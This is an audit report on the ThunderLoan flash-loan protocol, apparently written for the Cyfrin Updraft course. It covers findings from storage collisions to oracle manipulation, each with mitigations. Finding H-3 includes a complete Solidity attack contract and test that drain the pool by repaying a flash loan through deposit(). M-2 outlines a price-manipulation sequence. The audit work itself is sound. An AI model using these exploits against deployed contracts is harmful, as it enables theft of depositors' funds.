# Cyfrin Updraft ThunderLoan Audit

## High

### [H-1] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
uint256 private s_feePrecision;
uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the expected upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:

```javascript
uint256 private s_flashLoanFee; // 0.3% ETH fee
uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts.

**Impact:** After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally, the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.

**Proof of Code:** 
<details>
<summary>Code</summary>

Add the following code to the `ThunderLoanTest.t.sol` file:

```javascript
// You'll need to import `ThunderLoanUpgraded` as well
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

function testUpgradeBreaks() public {
    uint256 feeBeforeUpgrade = thunderLoan.getFee();
    vm.startPrank(thunderLoan.owner());
    ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
    thunderLoan.upgradeTo(address(upgraded));
    uint256 feeAfterUpgrade = thunderLoan.getFee();

    assert(feeBeforeUpgrade != feeAfterUpgrade);
}
```
</details>

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:

```diff
-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee; 
+    uint256 public constant FEE_PRECISION = 1e18;
```

### [H-2] Erroneous `ThunderLoan::updateExchangeRate` in the `ThunderLoan::deposit` function causes protocol to think it has more fees than it does, which blocks redemption and incorrectly sets the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it's responsible for keeping track of how many fees to give to liquidity providers.

However, the `deposit` function updates this rate, without collecting any fees!

```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    uint256 calculatedFee = getCalculatedFee(token, amount);
    assetToken.updateExchangeRate(calculatedFee);
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```

**Impact:** There are several impacts to this bug:
1. The `redeem` function is blocked, because the protocol thinks the owed tokens are more than actual.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than deserved.

**Proof of Concept:**

1. LP deposits
2. User takes out a flash loan
3. It is now impossible for LP to redeem

<details>
<summary>Code</summary>

Place the following into `ThunderLoanTest.t.sol`:

```solidity
function testRedeemAfterLoan() public setAllowedToken hasDeposits {
    uint256 amountToBorrow = AMOUNT * 10;
    uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

    vm.startPrank(user);
    tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
    thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
    vm.stopPrank();

    uint256 amountToRedeem = type(uint256).max;
    vm.startPrank(liquidityProvider);
    thunderLoan.redeem(tokenA, amountToRedeem);
    vm.stopPrank();
}
```
</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate.

### [H-3] All the funds can be stolen if the flash loan is returned using `deposit()`

**Description:** The `flashloan()` function performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing `endingBalance` with `startingBalance + fee`. However, a vulnerability emerges when calculating `endingBalance` using `token.balanceOf(address(assetToken))`.

Exploiting this vulnerability, an attacker can return the flash loan using the `deposit()` instead of `repay()`. This action allows the attacker to mint `AssetToken` and subsequently redeem it using `redeem()`. What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.

**Proof of Code:**

<details><summary>Code</summary>

```solidity
function testAttack() public setAllowedToken hasDeposits {
    uint256 amountToBorrow = AMOUNT * 10;
    vm.startPrank(user);
    tokenA.mint(address(attack), AMOUNT);
    thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
    attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
    thunderLoan.redeem(tokenA, type(uint256).max);
    vm.stopPrank();

    assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);   
}
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function getAssetFromToken(IERC20 token) external;
}


contract Attack {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
        
        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }
        
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function sendAssetToken(address assetToken) public {
        
        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
    }
}
```
</details>

**Impact:** All the funds of the AssetContract can be stolen.

**Recommended Mitigation:** Add a check in `deposit()` to make it impossible to use it in the same block of the flash loan. For example, register the `block.number` in a variable in `flashloan()` and check it in `deposit()`.

## Medium

### [M-1] Centralization risk for trusted owners

**Impact:** Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

**Instances (2):**
```solidity
File: src/protocol/ThunderLoan.sol

223:     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {

261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
```

### [M-2] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula-based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees. 

**Impact:** Liquidity providers will receive drastically reduced fees for providing liquidity. 

**Proof of Concept:** 

The following all happens in 1 transaction:

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price. 
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`. 
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper. 
```javascript
function getPriceInWeth(address token) public view returns (uint256) {
    address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
    return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
}
```
   3. The user then repays the first flash loan, and then repays the second flash loan.

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. 

## Low

### [L-1] Centralization Risk for trusted owners

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 239](src/protocol/ThunderLoan.sol#L239)

	```solidity
	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 265](src/protocol/ThunderLoan.sol#L265)

	```solidity
	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 293](src/protocol/ThunderLoan.sol#L293)

	```solidity
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 238](src/upgradedProtocol/ThunderLoanUpgraded.sol#L238)

	```solidity
	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 264](src/upgradedProtocol/ThunderLoanUpgraded.sol#L264)

	```solidity
	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)

	```solidity
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

</details>

### [L-2] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>1 Found Instances</summary>


- Found in src/protocol/OracleUpgradeable.sol [Line: 16](src/protocol/OracleUpgradeable.sol#L16)

	```solidity
	        s_poolFactory = poolFactoryAddress;
	```

</details>


### [L-3] `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 231](src/protocol/ThunderLoan.sol#L231)

	```solidity
	    function repay(IERC20 token, uint256 amount) public {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 277](src/protocol/ThunderLoan.sol#L277)

	```solidity
	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 281](src/protocol/ThunderLoan.sol#L281)

	```solidity
	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 230](src/upgradedProtocol/ThunderLoanUpgraded.sol#L230)

	```solidity
	    function repay(IERC20 token, uint256 amount) public {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 275](src/upgradedProtocol/ThunderLoanUpgraded.sol#L275)

	```solidity
	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 279](src/upgradedProtocol/ThunderLoanUpgraded.sol#L279)

	```solidity
	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
	```

</details>

### [L-4] Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

<details><summary>9 Found Instances</summary>


- Found in src/protocol/AssetToken.sol [Line: 31](src/protocol/AssetToken.sol#L31)

	```solidity
	    event ExchangeRateUpdated(uint256 newExchangeRate);
	```

- Found in src/protocol/ThunderLoan.sol [Line: 105](src/protocol/ThunderLoan.sol#L105)

	```solidity
	    event Deposit(address indexed account, IERC20 indexed token, uint256 amount);
	```

- Found in src/protocol/ThunderLoan.sol [Line: 106](src/protocol/ThunderLoan.sol#L106)

	```solidity
	    event AllowedTokenSet(IERC20 indexed token, AssetToken indexed asset, bool allowed);
	```

- Found in src/protocol/ThunderLoan.sol [Line: 107](src/protocol/ThunderLoan.sol#L107)

	```solidity
	    event Redeemed(
	```

- Found in src/protocol/ThunderLoan.sol [Line: 110](src/protocol/ThunderLoan.sol#L110)

	```solidity
	    event FlashLoan(address indexed receiverAddress, IERC20 indexed token, uint256 amount, uint256 fee, bytes params);
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 105](src/upgradedProtocol/ThunderLoanUpgraded.sol#L105)

	```solidity
	    event Deposit(address indexed account, IERC20 indexed token, uint256 amount);
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 106](src/upgradedProtocol/ThunderLoanUpgraded.sol#L106)

	```solidity
	    event AllowedTokenSet(IERC20 indexed token, AssetToken indexed asset, bool allowed);
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 107](src/upgradedProtocol/ThunderLoanUpgraded.sol#L107)

	```solidity
	    event Redeemed(
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 110](src/upgradedProtocol/ThunderLoanUpgraded.sol#L110)

	```solidity
	    event FlashLoan(address indexed receiverAddress, IERC20 indexed token, uint256 amount, uint256 fee, bytes params);
	```

</details>

### [L-5] PUSH0 is not supported by all chains

Solc compiler version 0.8.20 switches the default target EVM version to Shanghai, which means that the generated bytecode will include PUSH0 opcodes. Be sure to select the appropriate EVM version in case you intend to deploy on a chain other than mainnet like L2 chains that may not support PUSH0, otherwise deployment of your contracts will fail.

<details><summary>8 Found Instances</summary>


- Found in src/interfaces/IFlashLoanReceiver.sol [Line: 2](src/interfaces/IFlashLoanReceiver.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/interfaces/IPoolFactory.sol [Line: 2](src/interfaces/IPoolFactory.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/interfaces/ITSwapPool.sol [Line: 2](src/interfaces/ITSwapPool.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/interfaces/IThunderLoan.sol [Line: 2](src/interfaces/IThunderLoan.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/protocol/AssetToken.sol [Line: 2](src/protocol/AssetToken.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/protocol/OracleUpgradeable.sol [Line: 2](src/protocol/OracleUpgradeable.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/protocol/ThunderLoan.sol [Line: 64](src/protocol/ThunderLoan.sol#L64)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 64](src/upgradedProtocol/ThunderLoanUpgraded.sol#L64)

	```solidity
	pragma solidity 0.8.20;
	```

</details>

### [L-6] Unused Custom Error

It is recommended that the definition be removed when custom error is unused.

<details><summary>2 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 84](src/protocol/ThunderLoan.sol#L84)

	```solidity
	    error ThunderLoan__ExhangeRateCanOnlyIncrease();
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 84](src/upgradedProtocol/ThunderLoanUpgraded.sol#L84)

	```solidity
	    error ThunderLoan__ExhangeRateCanOnlyIncrease();
	```

</details>
